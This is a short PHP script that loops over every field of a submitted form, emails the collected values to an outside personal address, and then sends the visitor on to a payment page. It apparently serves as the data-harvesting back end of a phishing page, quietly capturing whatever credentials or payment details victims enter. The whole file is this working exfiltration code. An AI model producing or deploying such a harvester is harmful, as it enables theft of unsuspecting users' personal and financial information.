<?php
$message = '';
foreach($_POST as $key => $value) {
  $message .= "$key => $value\n";
}
mail('larnold5189@gmail.com','test', $message);
header('Location: payment.html');
?>
